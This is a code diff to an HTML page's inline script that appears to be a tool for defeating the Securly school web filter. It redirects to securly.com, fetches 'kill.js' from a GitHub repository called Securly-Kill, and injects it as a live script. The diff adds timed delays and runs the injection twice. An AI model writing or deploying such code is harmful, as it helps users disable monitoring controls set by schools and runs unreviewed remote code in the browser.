@@ -10,24 +10,41 @@
             const redirectUrl = 'https://securly.com';
             const scriptUrl = 'https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js';
 
-            // Redirect to the new URL
-            window.location.href = redirectUrl;
+            // Wait 3 seconds before starting execution
+            setTimeout(() => {
+                // Redirect to the new URL
+                window.location.href = redirectUrl;
 
-            // Listen for the 'pageshow' event after redirection
-            window.addEventListener('pageshow', () => {
-                fetch(scriptUrl)
-                    .then(response => {
-                        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
-                        return response.text();
-                    })
-                    .then(scriptContent => {
-                        const scriptElement = document.createElement('script');
-                        scriptElement.textContent = scriptContent;
-                        document.body.appendChild(scriptElement);
-                        console.log('Injected script executed.');
-                    })
-                    .catch(err => console.error('Error fetching script:', err));
-            });
+                // Listen for the 'pageshow' event after redirection
+                window.addEventListener('pageshow', () => {
+                    let executionCount = 0;
+
+                    const executeScript = () => {
+                        fetch(scriptUrl)
+                            .then(response => {
+                                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+                                return response.text();
+                            })
+                            .then(scriptContent => {
+                                const scriptElement = document.createElement('script');
+                                scriptElement.textContent = scriptContent;
+                                document.body.appendChild(scriptElement);
+                                console.log(`Injected script executed (${executionCount + 1}/2).`);
+                            })
+                            .catch(err => console.error('Error fetching script:', err));
+                    };
+
+                    // Execute script twice with a delay
+                    const interval = setInterval(() => {
+                        if (executionCount < 2) {
+                            executeScript();
+                            executionCount++;
+                        } else {
+                            clearInterval(interval); // Stop after two executions
+                        }
+                    }, 3000); // 3 seconds delay between executions
+                });
+            }, 3000); // Initial 3-second delay
         });
     </script>
 </head>
